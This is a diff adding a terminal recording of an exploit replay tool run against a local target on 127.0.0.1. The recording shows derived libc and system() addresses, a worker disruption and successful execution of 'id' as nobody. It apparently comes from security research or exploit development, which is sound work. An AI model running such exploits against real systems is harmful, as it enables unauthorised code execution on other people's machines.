@@ -1,0 +1,6 @@
+{"version":3,"term":{"cols":132,"rows":34},"timestamp":1779229783,"idle_time_limit":1.0,"command":"python3 tools/replay_learned_candidate.py --target 127.0.0.1:19321 --address 0x5555556b2167 --slot-offset 3136 --cmd id","title":"Clone-learned candidate replay against target","env":{"SHELL":"/opt/homebrew/bin/fish"}}
+[0.068, "o", "derived target worker pid: 47\r\nderived target libc base:  0x7ffffefc0000\r\nderived target system():   0x7fffff010d70\r\n"]
+[0.000, "o", "target:          127.0.0.1:19321\r\nmemory oracle:   none on target\r\nlearned address: 0x5555556b2167\r\nslot offset:     3136\r\nsystem():        0x7fffff010d70\r\nmarker:          /tmp/rift_replay_759c65d6aa08\r\n"]
+[0.000, "o", "command:         id\r\n\r\n"]
+[1.159, "o", "worker disruption: True\r\nproof: success\r\n\r\nuid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\r\n"]
+[0.020, "x", "0"]
